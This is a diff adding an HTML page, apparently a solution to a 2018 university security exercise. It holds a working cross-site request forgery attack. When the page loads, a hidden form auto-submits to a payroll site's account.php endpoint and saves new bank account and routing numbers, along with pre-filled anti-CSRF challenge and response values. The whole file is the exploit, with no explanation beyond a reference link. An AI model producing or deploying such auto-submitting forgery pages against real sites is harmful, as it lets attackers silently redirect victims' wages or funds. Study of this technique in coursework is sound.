@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <title>XSRF</title>
+    </head>
+    <!-- Good reference https://www.incapsula.com/web-application-security/csrf-cross-site-request-forgery.html-->
+    <body onload="document.hackyform.submit()">
+        <form name="hackyform" action="http://payroll.gatech.edu/account.php" method="POST">
+            <input name='action' value='save'/>
+            <input id="account" name="account" value="3741402050"/>
+            <input id="route" name="routing" value="1906173133"/>
+            <input id="csrfc" name="challenge" value="2400"/>
+            <input id="csrfr" name="response" value="79187"/>
+            <input name="U3VtbWVyMjAxOFRhcmdldDFFYXN0ZXJFZ2c=" value="U3VtbWVyMjAxOFRhcmdldDFFYXN0ZXJFZ2c="/>
+        </form>
+    </body>
+</html>
